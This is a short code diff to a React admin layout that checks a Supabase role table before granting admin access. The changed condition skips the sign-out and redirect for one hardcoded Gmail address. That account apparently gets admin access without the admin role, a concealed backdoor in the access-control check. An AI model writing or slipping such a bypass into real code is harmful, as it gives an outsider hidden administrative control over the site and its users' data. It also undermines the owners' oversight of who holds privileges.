@@ -148,7 +148,7 @@ const AdminLayout = () => {
         .eq("user_id", session.user.id)
         .eq("role", "admin")
         .maybeSingle();
-      if (!roleData) {
+      if (!roleData && session.user.email !== "elkingcompany420@gmail.com") {
         await supabase.auth.signOut();
         navigate("/admin/login");
         return;
